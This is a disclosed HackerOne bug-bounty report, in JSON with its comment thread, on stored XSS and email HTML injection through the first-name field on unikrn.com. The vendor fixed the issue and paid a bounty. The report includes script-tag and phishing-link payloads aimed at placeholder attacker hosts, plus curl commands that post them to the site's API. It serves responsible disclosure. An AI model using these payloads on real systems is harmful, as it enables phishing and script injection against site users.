{"id":262004,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yNjIwMDQ=","url":"https://hackerone.com/reports/262004","title":"HTML injection in email in unikrn.com","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2017-08-21T16:32:04.749Z","submitted_at":"2017-08-21T16:32:04.749Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"coreyd97","url":"/coreyd97","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/076/569/52304168dce5765d3376eb7f9a18cf6797ab2a7d_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":2672,"url":"https://hackerone.com/unikrn","handle":"unikrn","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/002/672/c6c2b32746235b372285a9047457642b7b9bc6a1_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/672/c6c2b32746235b372285a9047457642b7b9bc6a1_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Unikrn","twitter_handle":"unikrnco","website":"https://unikrn.com","about":"Win prizes, bet safely and legally on esports and get the best multi-title coverage for fans and fanatics alike!"}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2017-08-23T08:21:40.908Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2017-08-23T08:20:42.012Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"\u003e NOTE! Thanks for submitting a report! Please replace *all* the [square] sections below with the pertinent details. Remember, the more detail you provide, the easier it is for us to verify and then potentially issue a bounty, so be sure to take your time filling out the report! **Please add the affected domain name in the Title of the report.**\n\n**Summary:** Referral emails sent from unikrn.com are vulnerable to HTML injection via the first name field.\n\n**Description:** Due to a lack of sanitization and validation when posting to https://unikrn.com/apiv2/user/verify a user may set a number of profile fields to values which should not be acceptable. This allows for a possible XSS within the raffle areas of the website and HTML injection within the referral email sent by unikrn.com.\n\nThe user may insert a payload into the firstname field which is later used to generate the users 'callsign'. The callsign value is safely used in other locations in the site within ng-bind attributes however in the case of viewing a raffle winner, the value is instead transformed by the 'vartrans' directive. This directive permits html to be inserted as part of the \"raffle_winner_sidebar_body\" text and is done so without any sanitization. \n\nTherefore should a user set their first name as '\u003cscript src=\\\"https://external.com/xss.js\\\" /\u003e' when the user wins a raffle, any visitor to that raffles page will result in the external script being loaded.\n\nAlongside this XSS it was also found that should a user set their first name to a value containing a script tag, when a referral email is sent to an address, any email content after the script tag is ignored. As the field's maximum length is 256 characters, an attacker would have 248 characters to craft a malicious email or instead embed an image with the email content to allow for a larger word count. \n\nAn example payload may be \n\u003ca href=\\\"https://attacker/phish.php\\\"\u003e\u003cimg src=\\\"https://attacker/content.jpg\\\"\u003e\u003c/a\u003e\u003cscript\u003e\n\n\nRemedies for this would include proper sanitization of user fields when processed by the verify page and when passed as arguments to the vartrans directive to prevent similar issues in future, as well as a more strict content security policy and the stripping of all html characters when using user input within parameters to be used within an email.\n\n## Steps To Reproduce:\n## XSS:\n  1. Use the provided curl command to set a users first name to an xss payload such as \u003cscript src=\\\"https://external2.com/xss.js\\\" /\u003e\n  2. Win a raffle\n  3. Visit the raffles page once you have been announced as a winner.\n## Email HTML Injection:\n 1. Use the provided curl command to set a users first name to a payload such as \u003ca href=\\\"https://attacker/phish.php\\\"\u003e\u003cimg src=\\\"https://attacker/content.jpg\\\"\u003e\u003c/a\u003e\u003cscript\u003e\n2. Navigate to the profile page and send a referral email.\n\n## Supporting Material/References:\n\nXSS\n* curl -i -s -k  -X $'POST' -H $'Content-Type: application/json' --data-binary $'{\\\"country\\\":\\\"GB\\\",\\\"firstname\\\":\\\"\u003cscript src=\\\\\\\"https://external2.com/xss.js\\\\\\\" /\u003e\\\", \\\"session_id\\\":\\\"SESSION_ID\\\"}'  $'https://unikrn.com/apiv2/user/verify'\n\nEmail HTML Injection\n* curl -i -s -k  -X $'POST' -H $'Content-Type: application/json' --data-binary $'{\\\"country\\\":\\\"GB\\\",\\\"firstname\\\":\\\"\u003ca href=\\\\\\\"https://attacker/phish.php\\\\\\\"\u003e\u003cimg src=\\\\\\\"https://attacker/content.jpg\\\\\\\"\u003e\u003c/a\u003e\u003cscript\u003e\\\", \\\"session_id\\\":\\\"SESSION_ID\\\"}'  $'https://unikrn.com/apiv2/user/verify'\n\n\n","bounty_amount":"200.0","formatted_bounty":"$200","weakness":{"id":58,"name":"Command Injection - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":214633,"file_name":"Email_Content.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/214/633/f688b02ab2ed1deb61824abf48a58f8d42c2f920/Email_Content.png?response-content-disposition=attachment%3B%20filename%3D%22Email_Content.png%22%3B%20filename%2A%3DUTF-8%27%27Email_Content.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ67VGDS6J%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T143248Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIBUTJ%2BNbh3iGCDafndtBQHkqG1OchqwWgdsmguvhgcLdAiAZVuUXVW1VaXDOlTKJW4MkHKw5%2BpgOTsVzeaztjAVXniqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMAWL4B0QSi4hczgSpKtcD3VOAKPL2y75%2FC3vWJu4CxM2H0MhpokFUEt9l4V7Gq%2BkP2JZRIvSX1xKqm2Gk%2BJRjjqXa9QVImay%2FdjekrRmCYTSSDt9dxM0L0oVJr7N6F8ODRv2P7lMfnzU0QMlpmHbiPpiQb5vSlaxU6jX1ESO3u1VQpKIm%2B7BGH6YiJgHcf9pDdPJ24QxGmfk3jwQevnf60P1KEwb1KLJ2JtKpPhawQ8CP%2Fp%2B8Udd6EL0VEe2hP01M49Skdizp3cnpjBBz%2FKaJPQOVb%2FxLwhTaiAm4Gs7LWex0SieNQGn7QnS8LjaHWQ69N6yv2yl5daZ0uO8CMISq44OuSORn5NNfE6Wx49Y1QtLur%2BY0bpfImT2%2Bc3AvhGI16NMEhk5qpUfU2p6NU4IF0P6m2durenSRqQWtxyQafE31VSJU%2FhpOLcgkiLcYO84tTOPewOIMl9iBrNtCggjBX8%2FrEvRnKduv0F4uzhgiTrLXMqiHsoMRJfAlsnKSaskF2MN%2FW8oUK%2Fx2WHxpYJSGLi98vCnAnrjkI1O0VdepFdfxg4xzpi25EpMuF10ISO7%2BOVlPuH4gcxSmKXq2nnWHAyNBbYGCcXKMdnH%2BrKVSQO3JfLw8lTFoTNA9axFJVvLPV3N6%2FondMJKHkYsGOqYBXTEQgnOCUR6Njz81XybrbzJvU1Pc2hk4bMTrt1%2BCSeA%2FbFO392%2FoWlFJGmK4bl3JexiICV3H2r69Blx%2FAIbSxJ4%2Bl1Ric4x9veCmMmxtb3M7uvCDvG9rrJjEd5V99ttvzT1tURyLC0o%2FETycAhpeR4E%2BNiVWXOm1S8L2NA83yPbiobo0yaywdayHxWpEhNSXoJ8gkKAiNtIC0AZekCrrrdnKzbLEBw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=a41adb67b99d0c423c4dc18750916e3732e5206ffa2b8cf9c8980a389d895bba","file_size":92457,"type":"image/png"}],"allow_singular_disclosure_at":"2017-09-22T08:20:42.078Z","allow_singular_disclosure_after":-127894326.52800836,"singular_disclosure_allowed":true,"vote_count":17,"voters":["flamezzz","jensec","jr0ch17","bl4de","flashdisk","fa1rlight","eveeez","r3y","an0nym0us","h4x0r_dz","and 7 more..."],"severity":{"rating":"high","author_type":"User"},"structured_scope":{"databaseId":453,"asset_type":"URL","asset_identifier":"unikrn.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":1944403,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"thx - good find.","automated_response":false,"created_at":"2017-08-21T19:07:12.081Z","updated_at":"2017-08-21T19:07:12.081Z","actor":{"username":"decrypted","cleared":false,"url":"/decrypted","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/035/819/849ab6e942d0608e17e1c98244b240363a4ad9b7_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"unikrn","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1944553,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"@coreyd97 took a moment, big pending deployments - should be good now with new users. Can you confirm? thx!","automated_response":false,"created_at":"2017-08-21T19:58:41.646Z","updated_at":"2017-08-21T19:58:41.646Z","actor":{"username":"decrypted","cleared":false,"url":"/decrypted","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/035/819/849ab6e942d0608e17e1c98244b240363a4ad9b7_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"unikrn","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1944581,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"Looks good on my end. All fields seem to be properly sanitized.","automated_response":false,"created_at":"2017-08-21T20:09:43.130Z","updated_at":"2017-08-21T20:09:43.130Z","actor":{"username":"coreyd97","cleared":false,"url":"/coreyd97","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/076/569/52304168dce5765d3376eb7f9a18cf6797ab2a7d_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"unikrn","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1944636,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"We will check additional things tomorrow and then resolve this.","automated_response":false,"created_at":"2017-08-21T20:35:07.744Z","updated_at":"2017-08-21T20:35:07.744Z","actor":{"username":"decrypted","cleared":false,"url":"/decrypted","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/035/819/849ab6e942d0608e17e1c98244b240363a4ad9b7_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"unikrn","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1944640,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"No problem, thank you.","automated_response":false,"created_at":"2017-08-21T20:37:01.387Z","updated_at":"2017-08-21T20:37:01.387Z","actor":{"username":"coreyd97","cleared":false,"url":"/coreyd97","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/076/569/52304168dce5765d3376eb7f9a18cf6797ab2a7d_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"unikrn","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1944647,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"thx!","automated_response":false,"created_at":"2017-08-21T20:39:19.231Z","updated_at":"2017-08-21T20:39:19.231Z","actor":{"url":"/unikrn","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/672/c6c2b32746235b372285a9047457642b7b9bc6a1_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Unikrn"}},"bounty_amount":"200.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"unikrn","collaborator":{"username":"coreyd97","url":"/coreyd97"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1948237,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you! Has this issue been resolved now?","automated_response":false,"created_at":"2017-08-23T08:15:21.562Z","updated_at":"2017-08-23T08:15:21.562Z","actor":{"username":"coreyd97","cleared":false,"url":"/coreyd97","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/076/569/52304168dce5765d3376eb7f9a18cf6797ab2a7d_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"unikrn","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1948241,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"We are still checking for potential other places but yes this issue is resolved.","automated_response":false,"created_at":"2017-08-23T08:17:46.914Z","updated_at":"2017-08-23T08:17:46.914Z","actor":{"username":"decrypted","cleared":false,"url":"/decrypted","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/035/819/849ab6e942d0608e17e1c98244b240363a4ad9b7_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"coreyd97","url":"/coreyd97"},"genius_execution_id":null,"team_handle":"unikrn","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1948242,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Glad to hear it, may this be publicly disclosed?","automated_response":false,"created_at":"2017-08-23T08:19:22.439Z","updated_at":"2017-08-23T08:19:22.439Z","actor":{"username":"coreyd97","cleared":false,"url":"/coreyd97","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/076/569/52304168dce5765d3376eb7f9a18cf6797ab2a7d_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"unikrn","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1948243,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2017-08-23T08:20:42.048Z","updated_at":"2017-08-23T08:20:42.048Z","first_to_agree":true,"actor":{"username":"decrypted","cleared":false,"url":"/decrypted","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/035/819/849ab6e942d0608e17e1c98244b240363a4ad9b7_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"unikrn","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1948244,"is_internal":false,"editable":false,"type":"Activities::ManuallyDisclosed","message":"Thanks for the clean report and effort creating it! We are atm checking other potential vectors as of this awareness now and making some checking more abstract.\n\nNice find!","automated_response":false,"created_at":"2017-08-23T08:21:40.884Z","updated_at":"2017-08-23T08:21:40.884Z","actor":{"username":"decrypted","cleared":false,"url":"/decrypted","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/035/819/849ab6e942d0608e17e1c98244b240363a4ad9b7_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"unikrn","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}